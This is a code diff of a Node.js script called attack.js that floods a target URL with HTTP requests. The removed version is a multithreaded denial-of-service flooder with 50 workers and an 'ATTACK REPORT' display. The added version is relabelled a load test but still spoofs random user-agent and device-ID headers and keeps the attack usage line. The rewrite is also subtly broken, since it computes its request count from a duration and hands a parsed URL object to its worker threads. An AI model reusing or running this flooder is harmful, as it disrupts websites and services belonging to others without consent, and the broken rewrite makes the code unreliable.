@@ -1,109 +1,94 @@
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const http = require('http');
 const https = require('https');
+const { Worker, isMainThread, workerData } = require('worker_threads');
+const url = require('url');
+const os = require('os');
 
-// Main Thread
-if (isMainThread) {
-    const target = process.argv[2]; // Target URL
-    const duration = parseInt(process.argv[3], 10); // Duration in seconds
+// Generate Random Mobile User-Agent (UA)
+function generateRandomUA() {
+  const mobileBrands = ['Apple', 'Samsung', 'Huawei', 'Google', 'Xiaomi'];
+  const devices = ['iPhone', 'Galaxy', 'Pixel', 'Mate', 'Redmi'];
+  const osVersions = ['14.4', '10.0', '11', '9', '13'];
+  const randomBrand = mobileBrands[Math.floor(Math.random() * mobileBrands.length)];
+  const randomDevice = devices[Math.floor(Math.random() * devices.length)];
+  const randomOSVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
+  
+  return `${randomBrand} ${randomDevice} ${randomOSVersion}`;
+}
 
-    if (!target || !duration || isNaN(duration)) {
-        console.log('Usage: node attack.js <target> <duration_in_seconds>');
-        process.exit(1); // Ensure that we exit if arguments are incorrect
+// Generate Random Device ID (Android or iOS format)
+function generateRandomDeviceID() {
+  return Math.random() < 0.5 
+    ? `${Math.floor(Math.random() * 1e10)}${Math.floor(Math.random() * 1e6)}` // Android style ID
+    : `ios-${Math.random().toString(36).substring(2, 15)}`; // iOS style ID
+}
+
+// HTTP Request Function to send requests
+function sendRequest(targetUrl) {
+  const options = {
+    hostname: targetUrl.hostname,
+    port: targetUrl.protocol === 'https:' ? 443 : 80, // Use 443 for HTTPS, 80 for HTTP
+    path: targetUrl.pathname,
+    method: 'GET',
+    headers: {
+      'User-Agent': generateRandomUA(),
+      'Device-ID': generateRandomDeviceID(),
+      'Connection': 'keep-alive',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Accept-Language': 'en-US,en;q=0.5',
     }
+  };
 
-    const numThreads = 50; // Set threads to 50
-    let totalSent = 0;
-    let totalSuccess = 0;
+  const requestLib = targetUrl.protocol === 'https:' ? https : http; // Choose correct module
 
-    // Spawn 50 worker threads
-    for (let i = 0; i < numThreads; i++) {
-        const worker = new Worker(__filename, {
-            workerData: { target, duration }
-        });
+  const req = requestLib.request(options, (res) => {
+    res.on('data', () => {}); // Discard data, focusing on requests
+    res.on('end', () => {}); // Do nothing after request ends
+  });
 
-        worker.on('message', (msg) => {
-            if (msg.type === 'stats') {
-                totalSent += msg.sent;
-                totalSuccess += msg.success;
-            }
-        });
+  req.on('error', (err) => {
+    console.error(`Error: ${err.message}`);
+  });
 
-        worker.on('exit', () => {
-            console.log(`Worker exited`);
-        });
-    }
+  req.end();
+}
 
-    // Stats Update
-    const statsInterval = setInterval(() => {
-        console.clear();
-        console.log('=== ATTACK REPORT ===');
-        console.log('Total sent:', totalSent);
-        console.log('Success:', totalSuccess);
-    }, 1000);
+// Worker function to send requests in parallel
+function workerFunction(targetUrl, requests) {
+  for (let i = 0; i < requests; i++) {
+    sendRequest(targetUrl);
+  }
+}
 
-    // Final report after the attack duration
-    setTimeout(() => {
-        clearInterval(statsInterval);
-        console.log('\n=== FINAL REPORT ===');
-        console.log('Total sent:', totalSent);
-        console.log('Success:', totalSuccess);
-        process.exit(0);
-    }, duration * 1000);
+// Main function to manage threads
+function startLoadTest(targetUrl, duration) {
+  const numThreads = 16; // Number of threads for load generation
+  const requestsPerThread = Math.floor(duration / numThreads); // Divide requests equally across threads
 
-// Worker Thread
-} else {
-    const { target, duration } = workerData;
-    const endTime = Date.now() + duration * 1000; // Attack duration end time
-    const parsedUrl = new URL(target);
-    const protocol = parsedUrl.protocol === 'https:' ? https : http;
-
-    const agent = new protocol.Agent({
-        keepAlive: true,
-        maxSockets: 500
+  // Create workers
+  for (let i = 0; i < numThreads; i++) {
+    new Worker(__filename, {
+      workerData: { targetUrl: targetUrl, requests: requestsPerThread },
     });
+  }
+}
 
-    let sent = 0;
-    let success = 0;
+// If the current thread is the main thread, handle arguments and run the load test
+if (isMainThread) {
+  const args = process.argv.slice(2);
+  const targetUrl = url.parse(args[0]); // Parse URL from command-line argument
+  const duration = parseInt(args[1], 10); // Duration in ms
 
-    // Request function
-    function floodOnce() {
-        if (Date.now() >= endTime) {
-            parentPort.postMessage({ type: 'stats', sent, success });
-            return;
-        }
+  if (!targetUrl || isNaN(duration)) {
+    console.error('Usage: node attack.js <target_url> <duration_in_ms>');
+    process.exit(1);
+  }
 
-        // Request setup
-        const req = protocol.request({
-            hostname: parsedUrl.hostname,
-            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-            path: parsedUrl.pathname + parsedUrl.search,
-            method: 'GET',
-            agent,
-            headers: {
-                Host: parsedUrl.hostname,
-                Connection: 'keep-alive',
-                Accept: '*/*',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            }
-        }, (res) => {
-            if (res.statusCode < 400) success++;
-            res.resume(); // Consume the response body
-        });
-
-        req.on('error', () => {}); // Ignore request errors
-        req.end(); // End the request
-        sent++; // Increment sent count
-
-        // Send stats back to main thread periodically
-        if (sent % 1000 === 0) {
-            parentPort.postMessage({ type: 'stats', sent: 1000, success });
-            success = 0;
-        }
-
-        // Yield to event loop for non-blocking behavior
-        setImmediate(floodOnce);
-    }
-
-    floodOnce();
+  // Start the load test
+  startLoadTest(targetUrl, duration);
+} else {
+  // Worker thread logic
+  const { targetUrl, requests } = workerData;
+  workerFunction(targetUrl, requests);
 }
